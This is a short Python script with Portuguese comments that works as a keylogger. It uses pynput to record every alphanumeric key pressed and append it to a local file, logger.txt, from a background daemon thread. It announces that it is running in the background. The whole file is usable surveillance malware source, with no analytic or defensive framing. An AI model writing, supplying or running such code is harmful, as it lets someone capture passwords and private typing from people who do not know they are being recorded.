import pynput.keyboard
import threading
import os

# Caminho do arquivo de log
log_file = os.path.join(os.getcwd(), "logger.txt")

# Função para processar e salvar apenas letras e números
def on_press(key):
    try:
        if key.char.isalnum():  # pega só alfanuméricos
            with open(log_file, "a") as f:
                f.write(key.char)
    except AttributeError:
        # Ignora teclas especiais como shift, ctrl, etc.
        pass

# Função para iniciar o listener do teclado
def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Roda o keylogger em background usando thread
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.daemon = True
keylogger_thread.start()

print("Keylogger rodando em segundo plano...")

# Mantém o programa rodando
try:
    while True:
        pass
except KeyboardInterrupt:
    print("Keylogger finalizado.")
